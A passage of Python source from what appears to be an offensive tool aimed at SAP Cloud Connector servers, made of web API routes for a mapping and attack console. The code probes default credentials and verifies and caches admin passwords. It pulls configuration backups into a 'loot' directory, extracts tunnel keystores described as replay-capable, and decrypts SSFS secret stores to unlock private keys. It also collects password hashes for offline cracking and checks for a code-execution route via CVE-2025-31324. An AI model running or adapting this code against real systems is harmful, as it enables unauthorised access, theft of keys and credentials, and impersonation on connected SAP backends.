                        f"SCC default credentials live: {sess.user}/manage",
                        ref="scc.default.creds.live")
                    logout(sess)
                else:
                    tried = ", ".join(a["user"] for a in attempts) or "none"
                    sapmap_findings.emit_finding(
                        "HIGH", host,
                        f"SCC default-cred probe ran (rejected): tried {tried}",
                        ref="scc.default.creds.absent.but.probed")
            except Exception as e:
                print(f"[-] SCC {host}: probe failed: {e}")
            finally:
                _task_end(f"scc:{host}:probe_creds")
        threading.Thread(target=_run, daemon=True).start()
        return json.dumps({"status": "started"})

    @app.route("/api/scc/<host>/pull_mappings", method="POST")
    def scc_pull_mappings(host):
        response.content_type = "application/json"
        sn = api.state.scc_nodes.get(host)
        if not sn:
            return json.dumps({"error": f"SCC node {host} not found"})
        data = request.json or {}
        user = data.get("username", "")
        pwd = data.get("password", "")
        if not user or not pwd:
            return json.dumps({"error": "username + password required"})

        def _run():
            _task_start(f"scc:{host}:pull_mappings", f"SCC {host}: pulling mappings")
            try:
                from sapmap_scc_admin import login, pull_subaccounts, pull_mappings, pull_ha_state, logout
                sess = login(host, user, pwd, port=sn.admin_ui_port or 8443, timeout=10.0)
                if not sess:
                    sapmap_findings.emit_finding(
                        "INFO", host,
                        f"SCC mapping pull: login failed for {user}",
                        ref="scc.admin.login.failed")
                    return
                sn.admin_session_obtained = True
                sn.pwned = True
                # Cache verified Administrator credentials on the SCC node so
                # subsequent map actions (e.g. tunnel-relay tests) can reuse
                # them without prompting again.
                from sapmap_models import Credentials
                already = any(getattr(c, "username", "") == user
                              for c in (sn.credentials or []))
                if not already:
                    sn.credentials.append(Credentials(
                        username=user, password=pwd, verified=True,
                    ))
                sapmap_findings.emit_finding(
                    "CRITICAL", host,
                    f"SCC admin credentials verified: {user} — full Cloud "
                    f"Connector configuration access (mappings, channels, "
                    f"trust store, principal-propagation CA).",
                    ref="scc.admin.creds.verified",
                    meta={"user": user})
                if sess.version:
                    sn.version = sess.version
                    sn.version_source = "api"
                # Re-score CVE buckets now that we have an authoritative
                # version (and possibly an updated bundle hash).  The
                # initial scanner pass uses the favicon/bundle-derived
                # version which is sometimes coarser; the API banner is
                # exact, so suspected entries can sharpen.
                try:
                    from sapmap_scc_cve_buckets import score as _cve_score
                    res = _cve_score(sn.version or "", sn.bundle_hash or "")
                    prev_conf = set(sn.cves_confirmed or [])
                    prev_susp = set(sn.cves_suspected or [])
                    sn.cves_confirmed = list(res["confirmed"])
                    sn.cves_suspected = list(res["suspected"])
                    sn.cve_details = list(res["details"])
                    new_conf = set(sn.cves_confirmed) - prev_conf
                    new_susp = set(sn.cves_suspected) - prev_susp
                    for c in res["details"]:
                        cve = c["cve"]
                        if cve in new_conf:
                            sapmap_findings.emit_finding(
                                c["severity"], host,
                                f"SCC {sn.version} [CONFIRMED via bundle hash]: "
                                f"{c['headline']}",
                                cve=cve, ref=c.get("ref", ""))
                        elif cve in new_susp:
                            sapmap_findings.emit_finding(
                                c["severity"], host,
                                f"SCC {sn.version} [suspected]: {c['headline']}",
                                cve=cve, ref=c.get("ref", ""))
                except Exception as e:
                    print(f"[-] SCC {host}: CVE re-score failed: {e}")
                # HA pair detection — populate ha_role / ha_shadow_host on
                # the node and register the peer as a sibling SCC so it
                # plots on the map with a shadow link.
                ha = pull_ha_state(sess, timeout=8.0) or {}
                if ha:
                    sn.ha_role = ha.get("role", "") or ""
                    sn.ha_peer_role = ha.get("peer_role", "") or ""
                    peer_host = ha.get("peer_host", "") or ""
                    sn.ha_shadow_host = peer_host
                    if peer_host:
                        sapmap_findings.emit_finding(
                            "MEDIUM", host,
                            f"SCC HA pair detected: {sn.ha_role or '?'} ↔ "
                            f"{ha.get('peer_role') or '?'} {peer_host}. "
                            f"Compromise of either node yields the same "
                            f"tunnel privkey + PP CA — both must be patched.",
                            ref="scc.ha.pair",
                            meta={"role": sn.ha_role,
                                  "peer_role": ha.get("peer_role"),
                                  "peer_host": peer_host})
                        # Register the peer as its own SCCNode so the
                        # front-end draws it.  Don't overwrite an existing
                        # entry — the peer may already have been scanned.
                        if peer_host not in api.state.scc_nodes:
                            from sapmap_models import SCCNode
                            api.state.scc_nodes[peer_host] = SCCNode(
                                host=peer_host,
                                ip=peer_host,
                                admin_ui_port=sn.admin_ui_port or 8443,
                                ha_role=ha.get("peer_role", "") or "",
                                ha_peer_role=sn.ha_role,
                                ha_shadow_host=host,
                                tunnel_region=sn.tunnel_region,
                                notes=f"Discovered as HA peer of {host}",
                            )
                        else:
                            peer_node = api.state.scc_nodes[peer_host]
                            if not peer_node.ha_shadow_host:
                                peer_node.ha_shadow_host = host
                            if not peer_node.ha_role:
                                peer_node.ha_role = ha.get("peer_role", "") or ""
                            if not peer_node.ha_peer_role:
                                peer_node.ha_peer_role = sn.ha_role
                    else:
                        # Dump every endpoint we tried (status + body
                        # prefix) so we can spot which URL exposes the
                        # shadowHost / masterHost on this SCC build.
                        try:
                            print(f"[i] SCC {host}: HA raw payload = "
                                  f"{json.dumps(ha.get('raw', {}), default=str)[:1500]}")
                        except Exception:
                            print(f"[i] SCC {host}: HA raw payload "
                                  f"(unprintable): {ha.get('raw')}")
                        for plog in (ha.get("probe_log") or []):
                            try:
                                pth, st, bp = plog
                                print(f"[i] SCC {host}: HA probe "
                                      f"{pth} -> HTTP {st}  body={bp!r}")
                            except Exception:
                                pass
                        # role=shadow on its own already proves HA — no
                        # standalone connector ever reports as shadow.
                        if (sn.ha_role or "").lower() == "shadow":
                            sapmap_findings.emit_finding(
                                "MEDIUM", host,
                                f"SCC HA: this connector is a SHADOW — "
                                f"its master peer host could not be "
                                f"located via the REST API.  Pull "
                                f"backup to recover masterHost from "
                                f"scc_config.ini.",
                                ref="scc.ha.shadow.no_peer",
                                meta={"role": sn.ha_role,
                                      "raw": ha.get("raw", {})})
                        else:
                            sapmap_findings.emit_finding(
                                "INFO", host,
                                f"SCC HA: standalone (role={sn.ha_role or '?'}, "
                                f"no shadow configured).",
                                ref="scc.ha.standalone",
                                meta={"role": sn.ha_role,
                                      "raw": ha.get("raw", {})})
                subs = pull_subaccounts(sess, timeout=10.0) or []
                all_maps = []
                uuids = []
                for s in subs:
                    if not isinstance(s, dict):
                        continue
                    uuid = s.get("subaccount") or s.get("subaccountId") or s.get("uuid") or ""
                    if uuid:
                        uuids.append(uuid)
                        m = pull_mappings(sess, uuid, timeout=10.0) or []
                        all_maps.extend(m)
                    region = s.get("region") or s.get("regionHost") or ""
                    if region and region not in (sn.tunnel_region or ""):
                        sn.tunnel_region = region
                _apply_mappings_to_state(host, sn, all_maps, uuids)
                logout(sess)
            except Exception as e:
                print(f"[-] SCC {host}: mapping pull failed: {e}")
            finally:
                _task_end(f"scc:{host}:pull_mappings")
        threading.Thread(target=_run, daemon=True).start()
        return json.dumps({"status": "started"})

    def _apply_mappings_to_state(host, sn, all_maps, uuids):
        """Persist mappings on the SCC node, rebuild scc_links across all
        SAP nodes, and emit per-mapping risk findings.  Shared between
        live admin pull and offline backup-zip parse."""
        sn.subaccount_uuids = list(dict.fromkeys(uuids))
        sn.mappings = all_maps
        sn.principal_propagation_enabled = any(
            m.get("principal_propagation") for m in all_maps)
        # Probe every mapping upfront so the front-end edge color logic
        # sees uniform `reachable` data across all mappings to a given
        # backend.  Without this, only the placeholder-trigger mapping
        # would be probed, and a later manual Probe Mappings sweep could
        # leave one mapping reachable=true and a sibling reachable=false
        # → red edge instead of green.
        from sapmap_scc_relay import probe_mapping
        for m in all_maps:
            if not isinstance(m, dict):
                continue
            try:
                probe_mapping(m, timeout=3.0)
            except Exception:
                pass
        for n in api.state.nodes.values():
            if n.scc_links and host in n.scc_links:
                n.scc_links = [h for h in n.scc_links if h != host]
        sapmap_findings.emit_finding(
            "HIGH", host,
            f"SCC mappings extracted: {len(all_maps)} mapping(s), "
            f"{len(uuids)} subaccount(s)",
            ref="scc.mappings.extracted",
            meta={"subaccounts": len(uuids), "mappings": len(all_maps)})
        for m in all_maps:
            label = (f"{m.get('virtual_host','?')}:{m.get('virtual_port',0)} "
                     f"-> {m.get('internal_host','?')}:{m.get('internal_port',0)}")
            sid_label = m.get("sid") or "?"
            proto = (m.get("protocol") or "").upper()
            auth = m.get("authentication_mode") or ""
            bt = m.get("backend_type") or ""
            if auth in ("KERBEROS", "X509_GENERAL"):
                sapmap_findings.emit_finding(
                    "HIGH", host,
                    f"SCC mapping {label} [{sid_label}/{proto}] "
                    f"uses {auth} principal propagation — backend trusts "
                    f"any user the SCC asserts.",
                    ref="scc.mapping.principal_propagation",
                    meta={"mapping": label, "auth": auth,
                          "sid": sid_label, "backend_type": bt})
            for r in (m.get("path_allowlist") or []):
                if not isinstance(r, dict):
                    continue
                rpath = (r.get("path") or "").strip()
                rpolicy = (r.get("policy") or "").upper()
                if not r.get("enabled", True):
                    continue
                is_subpath_match = (rpolicy == "PATH_AND_ALL_SUB_PATHS"
                                    or (not r.get("exact_match_only", True)))
                if rpath == "/":
                    sapmap_findings.emit_finding(
                        "HIGH", host,
                        f"SCC mapping {label} [{sid_label}] exposes "
                        f"path '/' (full backend) to subaccount "
                        f"{m.get('virtual_host','?')}.",
                        ref="scc.mapping.path.root",
                        meta={"mapping": label, "path": rpath, "sid": sid_label})
                elif rpath in ("/sap/", "/sap") and is_subpath_match:
                    sapmap_findings.emit_finding(
                        "MEDIUM", host,
                        f"SCC mapping {label} [{sid_label}] allows "
                        f"'/sap/' and all sub-paths — entire ABAP "
                        f"namespace is reachable through the tunnel.",
                        ref="scc.mapping.path.sap_namespace",
                        meta={"mapping": label, "path": rpath, "sid": sid_label})
            msid = (m.get("sid") or "").strip().upper()
            ihost = m.get("internal_host") or ""
            iport = int(m.get("internal_port") or 0)
            matched_node = None
            for n in api.state.nodes.values():
                match = False
                if msid:
                    match = (n.sid or "").upper() == msid
                elif ihost:
                    match = (n.hostname == ihost or n.ip == ihost)
                if match:
                    matched_node = n
                    break
            if matched_node is None and (msid or ihost):
                # Backend isn't on the map yet — only synthesize a
                # placeholder if the upfront smoke-test confirmed the
                # target is reachable.  Avoids cluttering the map with
                # dead / typo'd / decommissioned mappings.
                if not m.get("reachable"):
                    sapmap_findings.emit_finding(
                        "INFO", host,
                        f"SCC mapping {ihost}:{iport} [{msid or '?'}] "
                        f"unreachable on smoke test — not adding to map "
                        f"({m.get('probe_error') or 'no response'}).",
                        ref="scc.mapping.discovered.unreachable",
                        meta={"host": ihost, "port": iport, "sid": msid,
                              "error": m.get("probe_error")})
                    continue
                # SID precedence: mapping.sid > EXT_<ihost>_<iport>.
                # Mirrors the UNK_/ACL_ pattern used by the scanner.
                is_ip = (ihost.count(".") == 3
                         and all(p.isdigit() for p in ihost.split(".")))
                if msid and msid not in api.state.nodes:
                    new_sid = msid
                else:
                    slug = (ihost or "unknown").replace(".", "_").replace(":", "_")
                    new_sid = (f"EXT_{slug}_{iport}" if iport
                               else f"EXT_{slug}")
                if new_sid in api.state.nodes:
                    matched_node = api.state.nodes[new_sid]
                else:
                    sys_type = {
                        "abapSys": "ABAP",
                        "javaSys": "JAVA",
                        "abapJavaSys": "ABAP+JAVA",
                        "hanaDB": "HANA",
                    }.get(m.get("backend_type", ""), "")
                    placeholder = SAPNode(
                        sid=new_sid,
                        ip=ihost if is_ip else "",
                        hostname="" if is_ip else ihost,
                        system_type=sys_type,
                    )
                    api.state.add_node(placeholder)
                    matched_node = placeholder
                    sapmap_findings.emit_finding(
                        "INFO", host,
                        f"SCC mapping discovered new on-prem backend "
                        f"{ihost}:{iport} [{new_sid}] — reachable on smoke "
                        f"test ({m.get('probe_latency_ms', 0)}ms"
                        f"{(' · ' + m['probe_signature']) if m.get('probe_signature') else ''})"
                        f" — added to map.",
                        ref="scc.mapping.discovered.node",
                        meta={"sid": new_sid, "host": ihost, "port": iport,
                              "backend_type": m.get("backend_type", ""),
                              "auth": m.get("authentication_mode", ""),
                              "latency_ms": m.get("probe_latency_ms", 0),
                              "signature": m.get("probe_signature", "")})
            if matched_node and host not in matched_node.scc_links:
                matched_node.scc_links.append(host)

    def _apply_ssfs_decrypt_result(host, sn, res):
        """Update SCC node state + emit findings from a decrypt_and_unlock
        result.  Shared between extract_keystore (auto-chain) and
        decrypt_ssfs (manual JNI fallback)."""
        if not res.get("ok"):
            sapmap_findings.emit_finding(
                "INFO", host,
                f"SCC SSFS decryption failed: {res.get('error','?')}",
                ref="scc.ssfs.decrypt.failed",
                meta={"error": res.get("error")})
            return
        sn.ssfs_decrypted = True
        sn.ssfs_secrets_path = res.get("secrets_path", "")
        sn.ssfs_secrets_keys = list(res.get("secrets_keys", []))
        sn.unlocked_keystores = list(res.get("keystores", []))
        for k in sn.unlocked_keystores:
            p = (k.get("path") or "")
            sha = k.get("cert_sha256") or ""
            if p == "scc_config/scc.p12" and sha:
                sn.tunnel_privkey_fp = sha
        for k in sn.unlocked_keystores:
            subj = (k.get("cert_subject") or "").lower()
            extras = " ".join(k.get("extra_subjects") or []).lower()
            if "principal" in subj or "principal" in extras:
                if k.get("cert_sha256"):
                    sn.pp_ca_privkey_fp = k["cert_sha256"]
                    break
        key_names = ", ".join(sn.ssfs_secrets_keys) or "(none)"
        sapmap_findings.emit_finding(
            "CRITICAL", host,
            f"SCC SSFS decrypted: {len(sn.ssfs_secrets_keys)} secret(s) "
            f"recovered [{key_names}].  Plaintext side-file "
            f"{sn.ssfs_secrets_path} (mode 0600).",
            ref="scc.ssfs.decrypted",
            meta={"secrets_path": sn.ssfs_secrets_path,
                  "keys": list(sn.ssfs_secrets_keys),
                  "native_lib": res.get("native_lib", "")})
        for k in sn.unlocked_keystores:
            if k.get("error"):
                continue
            subj = k.get("cert_subject") or "(no cert)"
            sha = (k.get("cert_sha256") or "")[:16]
            sapmap_findings.emit_finding(
                "CRITICAL", host,
                f"SCC keystore unlocked: {k.get('path','?')} — "
                f"subject={subj} cert_sha256={sha}…  "
                f"{k.get('key_type','?')}/{k.get('key_size','?')} key.",
                ref="scc.ssfs.keystore.unlocked",
                meta={"path": k.get("path"),
                      "cert_subject": subj,
                      "cert_sha256": k.get("cert_sha256"),
                      "key_type": k.get("key_type"),
                      "key_size": k.get("key_size"),
                      "valid_until": k.get("cert_not_after")})
        for kn in sn.ssfs_secrets_keys:
            if kn == "CLOUD_CONN/JAVA_KEYSTORE_PASSWORD":
                continue
            sapmap_findings.emit_finding(
                "HIGH", host,
                f"SCC SSFS secret recovered: {kn} — see "
                f"{sn.ssfs_secrets_path} for plaintext.",
                ref="scc.ssfs.secret.recovered",
                meta={"key": kn,
                      "secrets_path": sn.ssfs_secrets_path})

    @app.route("/api/scc/<host>/extract_keystore", method="POST")
    def scc_extract_keystore(host):
        """Pull the full SCC configuration backup and parse out the
        per-subaccount tunnel keystores + system keystore + SSFS blob.
        Drops the loot zip under ./loot/scc/<host>/ with mode 0600."""
        response.content_type = "application/json"
        sn = api.state.scc_nodes.get(host)
        if not sn:
            return json.dumps({"error": f"SCC node {host} not found"})
        data = request.json or {}
        user = data.get("username", "")
        pwd = data.get("password", "")
        backup_pwd = data.get("backup_password", "") or pwd
        if not user or not pwd:
            return json.dumps({"error": "username + password required"})
        if not backup_pwd:
            return json.dumps({"error": "backup_password required"})

        def _run():
            _task_start(f"scc:{host}:extract_keystore",
                        f"SCC {host}: pulling backup + parsing keystores")
            try:
                from sapmap_scc_keystore import extract_keystore
                res = extract_keystore(
                    host, user, pwd,
                    backup_password=backup_pwd,
                    port=sn.admin_ui_port or 8443,
                    timeout=30.0)
                if not res.get("ok"):
                    sapmap_findings.emit_finding(
                        "INFO", host,
                        f"SCC keystore extraction failed: "
                        f"{res.get('error', 'unknown error')}",
                        ref="scc.keystore.extract.failed",
                        meta={"error": res.get("error")})
                    return
                # Authenticated admin login implies pwned (same status the
                # pull_mappings flow flips); set if not already.
                sn.admin_session_obtained = True
                sn.pwned = True
                from sapmap_models import Credentials
                if not any(getattr(c, "username", "") == user
                           for c in (sn.credentials or [])):
                    sn.credentials.append(Credentials(
                        username=user, password=pwd, verified=True))
                sn.keystore_extracted = True
                sn.keystore_loot_path = res.get("loot_path", "")
                # Store backup password in-memory for future decryption attempts
                bpw = data.get("backup_password", "") or data.get("password", "")
                if bpw:
                    sn.backup_password = bpw

                # Try to decrypt config/users.xml from the backup zip now
                # (succeeds once option-3 cipher RE is done and wired in)
                if sn.keystore_loot_path and bpw:
                    try:
                        from sapmap_scc_keystore import try_decrypt_users_xml
                        loot_dir = os.path.dirname(sn.keystore_loot_path)
                        cached = try_decrypt_users_xml(
                            sn.keystore_loot_path, bpw, loot_dir)
                        if cached:
                            sn.users_xml_loot_path = cached
                            print(f"[+] SCC {host}: users.xml decrypted and cached at {cached}")
                        else:
                            print(f"[*] SCC {host}: users.xml backup cipher not yet cracked "
                                  f"(option-3 backlog) — backup_password stored for later")
                    except Exception as ue:
                        print(f"[-] SCC {host}: users.xml decrypt attempt error: {ue}")

                sys_ks = res.get("system_keystore") or {}
                tun_ks = res.get("tunnel_keystores") or []
                # tunnel_privkey_fp = SHA-256 of the system identity p12;
                # the per-subaccount fingerprints are surfaced in findings.
                if sys_ks.get("sha256"):
                    sn.tunnel_privkey_fp = sys_ks["sha256"]
                # pp_ca_privkey_fp: SAP stores the PP CA private key
                # inside the SSFS blob (SSFS_SCC.KEY/.DAT).  We fingerprint
                # those bytes so cross-session tracking still works
                # without unlocking the SSFS.
                if res.get("ssfs_present"):
                    # Re-read the zip to get the SSFS contents and hash.
                    try:
                        import io as _io, zipfile as _zf, hashlib as _h
                        with open(sn.keystore_loot_path, "rb") as fh:
                            blob = fh.read()
                        z = _zf.ZipFile(_io.BytesIO(blob))
                        h = _h.sha256()
                        for nm in ("scc_config/SSFS_SCC.KEY",
                                   "scc_config/SSFS_SCC.DAT"):
                            try:
                                h.update(z.read(nm))
                            except KeyError:
                                pass
                        sn.pp_ca_privkey_fp = h.hexdigest()
                    except Exception:
                        sn.pp_ca_privkey_fp = ""
                sapmap_findings.emit_finding(
                    "CRITICAL", host,
                    f"SCC keystore looted: backup zip ({res.get('loot_size',0)} B) "
                    f"saved to {sn.keystore_loot_path}. "
                    f"{len(tun_ks)} subaccount tunnel keystore(s) extracted, "
                    f"system identity keystore extracted"
                    f"{', SSFS (PP CA private key) present' if res.get('ssfs_present') else ''}.",
                    ref="scc.keystore.extracted",
                    meta={"loot_path": sn.keystore_loot_path,
                          "system_p12_sha256": sys_ks.get("sha256"),
                          "tunnel_count": len(tun_ks),
                          "ssfs": res.get("ssfs_present"),
                          "users_xml": res.get("users_xml_present")})
                # Per-subaccount finding so the operator sees every
                # tunnel cert they now own.
                for k in tun_ks:
                    sapmap_findings.emit_finding(
                        "CRITICAL", host,
                        f"SCC tunnel client keystore for subaccount "
                        f"{k['subaccount']} ({k['region']}) "
                        f"sha256={k['sha256'][:16]}… — replay-capable.",
                        ref="scc.keystore.tunnel.subaccount",
                        meta={"subaccount": k["subaccount"],
                              "region": k["region"],
                              "sha256": k["sha256"],
                              "path_in_zip": k["path"]})
                if res.get("users_xml_present"):
                    sapmap_findings.emit_finding(
                        "HIGH", host,
                        f"SCC config/users.xml extracted "
                        f"(sha256={res.get('users_xml_sha256','')[:16]}…) — "
                        f"hashed local user passwords available for offline crack.",
                        ref="scc.keystore.users.xml",
                        meta={"users_xml_sha256": res.get("users_xml_sha256")})
                # Sharpen version from manifest if available.
                man_v = (res.get("manifest") or {}).get("version") or ""
                if man_v and not sn.version:
                    sn.version = man_v
                    sn.version_source = "backup-manifest"
                # Auto-map: parse cloud→on-prem mappings straight out of
                # the backup zip (backends.xml per subaccount) so the
                # operator gets the same map plot as the live "Pull
                # Mappings" action without a second admin call.  Skip
                # when sn.mappings is already populated by a recent live
                # pull — avoid duplicate findings.
                if not sn.mappings:
                    try:
                        from sapmap_scc_keystore import parse_mappings_from_zip
                        mres = parse_mappings_from_zip(sn.keystore_loot_path)
                        if mres.get("ok"):
                            for region in (mres.get("regions") or []):
                                if region and region not in (sn.tunnel_region or ""):
                                    sn.tunnel_region = region
                            _apply_mappings_to_state(
                                host, sn,
                                mres.get("mappings") or [],
                                mres.get("subaccount_uuids") or [])
                        else:
                            print(f"[-] SCC {host}: offline mapping parse: "
                                  f"{mres.get('error')}")
                    except Exception as me:
                        print(f"[-] SCC {host}: offline mapping parse failed: {me}")
                # Auto-HA: scc_config.ini in the backup carries the full
                # HA state (haRole / isShadowEnabled / isHaActive /
                # shadowHost / masterHost), which the REST API doesn't
                # expose on most builds.  Parse it here so the violet
                # master↔shadow link gets drawn after a backup pull.
                try:
                    from sapmap_scc_keystore import parse_ha_state_from_zip
                    hres = parse_ha_state_from_zip(sn.keystore_loot_path)
                    if hres.get("ok"):
                        sn.ha_role = hres.get("role", "") or sn.ha_role
                        peer = hres.get("peer_host", "") or ""
                        peer_role = hres.get("peer_role", "") or ""
                        is_active = hres.get("is_ha_active", False)
                        is_enabled = hres.get("is_shadow_enabled", False)
                        if peer:
                            sn.ha_shadow_host = peer
                            sn.ha_peer_role = peer_role
                            sapmap_findings.emit_finding(
                                "MEDIUM", host,
                                f"SCC HA pair detected (from backup): "
                                f"{sn.ha_role or '?'} ↔ {peer_role or '?'} "
                                f"{peer} (active={is_active}, "
                                f"shadow_enabled={is_enabled}). "
                                f"Compromise of either node yields the "
                                f"same tunnel privkey + PP CA — both "
                                f"must be patched.",
                                ref="scc.ha.pair.backup",
                                meta={"role": sn.ha_role,
                                      "peer_role": peer_role,
                                      "peer_host": peer,
                                      "is_ha_active": is_active,
                                      "is_shadow_enabled": is_enabled})
                            if peer not in api.state.scc_nodes:
                                from sapmap_models import SCCNode
                                api.state.scc_nodes[peer] = SCCNode(
                                    host=peer,
                                    ip=peer,
                                    admin_ui_port=sn.admin_ui_port or 8443,
                                    ha_role=peer_role,
                                    ha_peer_role=sn.ha_role,
                                    ha_shadow_host=host,
                                    tunnel_region=sn.tunnel_region,
                                    notes=f"Discovered as HA peer of {host}",
                                )
                            else:
                                pn = api.state.scc_nodes[peer]
                                if not pn.ha_shadow_host:
                                    pn.ha_shadow_host = host
                                if not pn.ha_role:
                                    pn.ha_role = peer_role
                                if not pn.ha_peer_role:
                                    pn.ha_peer_role = sn.ha_role
                    else:
                        print(f"[-] SCC {host}: HA-from-zip parse: "
                              f"{hres.get('error')}")
                except Exception as he:
                    print(f"[-] SCC {host}: HA-from-zip parse failed: {he}")
                # Auto-decrypt: pure-Python decryptor has no extra
                # dependency cost, so chain decrypt+unlock immediately
                # whenever the backup contains an SSFS blob.
                if res.get("ssfs_present"):
                    try:
                        from sapmap_scc_ssfs_decrypt import decrypt_and_unlock
                        d = decrypt_and_unlock(sn.keystore_loot_path)
                        _apply_ssfs_decrypt_result(host, sn, d)
                    except Exception as de:
                        print(f"[-] SCC {host}: auto SSFS decrypt failed: {de}")
                        sapmap_findings.emit_finding(
                            "INFO", host,
                            f"SCC SSFS auto-decrypt error: {de}",
                            ref="scc.ssfs.decrypt.error",
                            meta={"error": str(de)})
            except Exception as e:
                print(f"[-] SCC {host}: keystore extract failed: {e}")
                sapmap_findings.emit_finding(
                    "INFO", host,
                    f"SCC keystore extraction error: {e}",
                    ref="scc.keystore.extract.error",
                    meta={"error": str(e)})
            finally:
                _task_end(f"scc:{host}:extract_keystore")
        threading.Thread(target=_run, daemon=True).start()
        return json.dumps({"status": "started"})

    @app.route("/api/scc/<host>/probe_mappings", method="POST")
    def scc_probe_mappings(host):
        """Tunnel-relay smoke test: TCP/HTTP probe every mapping's
        internal endpoint to confirm the on-prem backend is actually
        reachable from this network.  No credentials are sent."""
        response.content_type = "application/json"
        sn = api.state.scc_nodes.get(host)
        if not sn:
            return json.dumps({"error": f"SCC node {host} not found"})
        if not sn.mappings:
            return json.dumps({"error": "no mappings on this SCC — pull them first"})

        def _run():
            _task_start(f"scc:{host}:probe_mappings",
                        f"SCC {host}: probing {len(sn.mappings)} mapping(s)")
            try:
                from sapmap_scc_relay import probe_mapping
                ok_n = 0
                fail_n = 0
                for m in sn.mappings:
                    if not isinstance(m, dict):
                        continue
                    res = probe_mapping(m, timeout=4.0)
                    label = (f"{m.get('virtual_host','?')}:{m.get('virtual_port',0)}"
                             f" -> {m.get('internal_host','?')}:{m.get('internal_port',0)}")
                    sid_label = m.get("sid") or "?"
                    proto = (m.get("protocol") or "").upper() or "TCP"
                    if res["reachable"]:
                        ok_n += 1
                        sapmap_findings.emit_finding(
                            "INFO", host,
                            f"SCC mapping reachable: {label} [{sid_label}/{proto}]"
                            f" — {res['probe_latency_ms']}ms"
                            f"{(' · ' + res['probe_signature']) if res['probe_signature'] else ''}",
                            ref="scc.mapping.reachable",
                            meta={"mapping": label, "sid": sid_label,
                                  "protocol": proto,
                                  "latency_ms": res["probe_latency_ms"],
                                  "signature": res["probe_signature"]})
                    else:
                        fail_n += 1
                        sapmap_findings.emit_finding(
                            "MEDIUM", host,
                            f"SCC mapping UNREACHABLE: {label} [{sid_label}/{proto}]"
                            f" — {res['probe_error']}.  Tunnel would 502 on cloud-side requests.",
                            ref="scc.mapping.unreachable",
                            meta={"mapping": label, "sid": sid_label,
                                  "protocol": proto,
                                  "error": res["probe_error"]})
                sapmap_findings.emit_finding(
                    "INFO", host,
                    f"SCC tunnel-relay smoke test complete: "
                    f"{ok_n} reachable, {fail_n} unreachable "
                    f"(of {len(sn.mappings)} mapping(s)).",
                    ref="scc.mapping.probe.summary",
                    meta={"reachable": ok_n, "unreachable": fail_n,
                          "total": len(sn.mappings)})
            except Exception as e:
                print(f"[-] SCC {host}: mapping probe failed: {e}")
            finally:
                _task_end(f"scc:{host}:probe_mappings")
        threading.Thread(target=_run, daemon=True).start()
        return json.dumps({"status": "started", "count": len(sn.mappings)})

    @app.route("/api/scc/<host>/decrypt_ssfs", method="POST")
    def scc_decrypt_ssfs(host):
        """Decrypt SSFS_SCC inside the loot zip using the SAP-shipped JNI
        helper, then unlock every .p12 with the recovered keystore password.
        Persists plaintext SSFS values to a side file at mode 0600 — only
        the key NAMES are surfaced via findings/drawer."""
        response.content_type = "application/json"
        sn = api.state.scc_nodes.get(host)
        if not sn:
            return json.dumps({"error": f"SCC node {host} not found"})
        if not sn.keystore_loot_path or not os.path.isfile(sn.keystore_loot_path):
            return json.dumps({"error": "no loot zip on this SCC — run "
                                          "Extract Keystore first"})
        data = request.json or {}
        scc_native_dir = data.get("scc_native_dir", "") or data.get("scc_native_lib", "")
        helper_jar = data.get("helper_jar", "") or None
        java_bin = data.get("java_bin", "") or "java"
        sid = data.get("sid", "") or "SCC"
        timeout = float(data.get("timeout", 30.0))

        def _run():
            _task_start(f"scc:{host}:decrypt_ssfs",
                        f"SCC {host}: decrypting SSFS + unlocking keystores")
            try:
                from sapmap_scc_ssfs_decrypt import decrypt_and_unlock
                res = decrypt_and_unlock(
                    sn.keystore_loot_path,
                    scc_native_lib=scc_native_dir or None,
                    helper_jar=helper_jar,
                    java_bin=java_bin,
                    sid=sid,
                    timeout=timeout,
                )
                _apply_ssfs_decrypt_result(host, sn, res)
            except Exception as e:
                print(f"[-] SCC {host}: SSFS decrypt failed: {e}")
                sapmap_findings.emit_finding(
                    "INFO", host,
                    f"SCC SSFS decryption error: {e}",
                    ref="scc.ssfs.decrypt.error",
                    meta={"error": str(e)})
            finally:
                _task_end(f"scc:{host}:decrypt_ssfs")
        threading.Thread(target=_run, daemon=True).start()
        return json.dumps({"status": "started"})

    @app.route("/api/scc/<host>/set_credentials", method="POST")
    def scc_set_credentials(host):
        """Store credentials for an SCC node so pull-mappings and
        extract-keystore can auto-fill without prompting again."""
        response.content_type = "application/json"
        sn = api.state.scc_nodes.get(host)
        if not sn:
            return json.dumps({"error": f"SCC node {host} not found"})
        data = request.json or {}
        user = data.get("username", "").strip()
        pwd = data.get("password", "")
        if not user or not pwd:
            return json.dumps({"error": "username and password are required"})
        from sapmap_models import Credentials as _Creds
        sn.credentials = [_Creds(username=user, password=pwd, verified=False)]
        print(f"[*] SCC {host}: credentials stored for {user}")
        return json.dumps({"ok": True})

    @app.route("/api/scc/<host>/download_user_hashes", method="POST")
    def scc_download_user_hashes(host):
        """Read SCC users.xml and return parsed password hashes + hashcat
        instructions.

        Resolution order:
          1. On-disk via a co-located pwned SAP node (OS exec)
          2. From the backup zip already on disk (if not zip-encrypted)
          3. REST API /api/v1/users (user list only — no hashes; shown as
             fallback so the operator at least sees who's there)
        """
        response.content_type = "application/json"
        sn = api.state.scc_nodes.get(host)
        if not sn:
            return json.dumps({"error": f"SCC node {host} not found"})

        import re as _re
        xml_bytes = None
        xml_source = ""
        # All identifiers we consider "this SCC host"
        scc_addrs = {a.lower() for a in [sn.ip, sn.host, host] if a}
        print(f"[*] SCC {host}: download_user_hashes — "
              f"scc_addrs={scc_addrs}")

        # --- Path 0: cached plaintext from previous extraction ----------
        if not xml_bytes and sn.users_xml_loot_path:
            try:
                with open(sn.users_xml_loot_path, "rb") as fh:
                    raw = fh.read()
                if raw[:1] in (b"<", b"\xef"):
                    xml_bytes = raw
                    xml_source = f"cached plaintext ({sn.users_xml_loot_path})"
                    print(f"[+] SCC {host}: users.xml from cache "
                          f"({len(xml_bytes)} bytes)")
            except Exception as e:
                print(f"[-] SCC {host}: cache read error: {e}")
                sn.users_xml_loot_path = ""  # clear stale path

        # --- Path 1: co-located pwned SAP node ---------------------------
        for n in api.state.nodes.values():
            # Flexible match: any of ip/hostname must match any SCC addr
            node_addrs = {a.lower() for a in [n.ip or "", n.hostname or ""] if a}
            if not node_addrs & scc_addrs:
                print(f"[*] SCC {host}: Path 1 skip {n.sid} — "
                      f"addrs {node_addrs} ∩ {scc_addrs} = ∅")
                continue
            has_exec = (n.gw_vulnerable or n.cve_2025_31324_vulnerable
                        or bool(n.created_users))
            if not has_exec:
                print(f"[*] SCC {host}: Path 1 skip {n.sid} — "
